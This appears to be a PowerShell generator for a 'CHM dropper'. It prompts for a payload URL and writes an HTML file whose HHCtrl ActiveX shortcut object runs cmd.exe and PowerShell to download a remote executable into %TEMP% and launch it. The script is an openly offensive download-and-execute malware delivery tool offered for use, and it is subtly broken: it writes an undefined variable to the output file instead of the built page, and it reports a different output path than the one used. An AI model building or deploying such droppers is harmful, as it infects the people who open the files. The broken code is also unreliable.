# CHM Dropper 
# Only use when you know what you are doing :) 

$payload = Read-Host 'Pleace specify your payload (example :- http://website.com/payload.exe) ?'
$filename = Read-Host 'Please Specify output filename (example :- example.html) '
$process = Read-Host 'Please specify a proccess name (example :- lol)?'
$OutputPath = "$env:USERPROFILE\Desktop\$filename"

$html = @"

<HTML>
<TITLE>Malicious Bypass</TITLE>
<HEAD>
</HEAD>
<BODY>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=",cmd.exe,/c powershell (new-object System.Net.WebClient).DownloadFile('$payload','%TEMP%\$process.exe'); Start-Process '%TEMP%\$process.exe' ,">
<PARAM name="Item2" value="273,1,1">
</OBJECT>

"@ 

Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default

Write-Output "[+] File has been written to $env:APPDATA\Desktop\$filename [+]"
